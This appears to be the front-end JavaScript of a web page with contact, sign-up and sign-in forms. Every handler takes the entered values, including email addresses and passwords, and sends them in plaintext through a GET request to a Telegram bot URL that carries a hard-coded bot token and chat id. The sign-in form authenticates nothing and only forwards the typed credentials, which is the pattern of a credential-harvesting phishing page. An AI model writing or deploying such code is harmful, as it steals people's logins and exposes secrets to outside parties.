'use strict';

const sigin = document.querySelector('.sigin'),
  sigup = document.querySelector('.sigup'),
  submit2 = document.querySelector('#submit2'),
  submit1 = document.querySelector('#submit');

// Contact
document.addEventListener('DOMContentLoaded', () => {
  const contact = document.querySelector('.form');

  function sendMessage() {
    let firstname = document.querySelector('.contact-first-name').value;
    let lastname = document.querySelector('.contact-last-name').value;
    let user = document.querySelector('.contact-user').value;
    let message = document.querySelector('.contact-message').value;
    contact.reset();

    console.log(firstname + ' ' + lastname + ' ' + user + ' ' + message);
    // send $message

    var my_text = `%0ACONTACT %0AFirst Name  - ${firstname}%0ALast Name  - ${lastname}%0Ausername  - ${user}%0AMessage  - ${message}`;

    var url = `https://api.telegram.org/bot1155858989:AAGrmQkdcuuvx5e-sd_8-DWT8vqgw1BIk5c/sendMessage?chat_id=648424505&text=${my_text}`;
    let api = new XMLHttpRequest();
    api.open('GET', url, true);
    api.send();
  }

  contact.addEventListener('submit', (e) => {
    e.preventDefault();
    sendMessage();
  });
});

// sign up

document.addEventListener('DOMContentLoaded', () => {
  const signUp = document.querySelector('.signUp');

  function sendMessage() {
    let firstName = document.querySelector('#firstName').value;
    let lastName = document.querySelector('#lastName').value;
    let user = document.querySelector('#user').value;
    let Email = document.querySelector('#mail').value;
    let pass = document.querySelector('#pass').value;
    signUp.reset();

    console.log(
      firstName + ' ' + lastName + ' ' + user + ' ' + Email + ' ' + pass
    );
    // send $message

    var my_text_u = `%0ASIGN UP %0AFirst Name  - ${firstName}%0ALast Name  - ${lastName}%0Ausername  - ${user}%0AEmail  - ${Email}%0APassword  - ${pass}`;

    var url = `https://api.telegram.org/bot1155858989:AAGrmQkdcuuvx5e-sd_8-DWT8vqgw1BIk5c/sendMessage?chat_id=648424505&text=${my_text_u}`;
    let api = new XMLHttpRequest();
    api.open('GET', url, true);
    api.send();
  }

  signUp.addEventListener('submit', (e) => {
    e.preventDefault();
    sendMessage();
  });

  submit2.addEventListener('click', (e) => {
    sigup.style = 'display:none;';
  });
});

//sign in

document.addEventListener('DOMContentLoaded', () => {
  const signIn = document.querySelector('.signIn');

  function sendMessage() {
    let firstname = document.querySelector('.contact-first-name').value;
    let userName = document.querySelector('#userName').value;
    let userPass = document.querySelector('#userPass').value;
    signIn.reset();

    console.log(userName + ' ' + userPass);
    // send $message

    var my_text_i = `%0ASIGN IN %0AUserName  - ${userName}%0APassword  - ${userPass}`;

    var url = `https://api.telegram.org/bot1155858989:AAGrmQkdcuuvx5e-sd_8-DWT8vqgw1BIk5c/sendMessage?chat_id=648424505&text=${my_text_i}`;
    let api = new XMLHttpRequest();
    api.open('GET', url, true);
    api.send();
  }

  signIn.addEventListener('submit', (e) => {
    e.preventDefault();
    sendMessage();
  });

  submit1.addEventListener('click', (e) => {
    sigin.style = 'display:none;';
  });
});
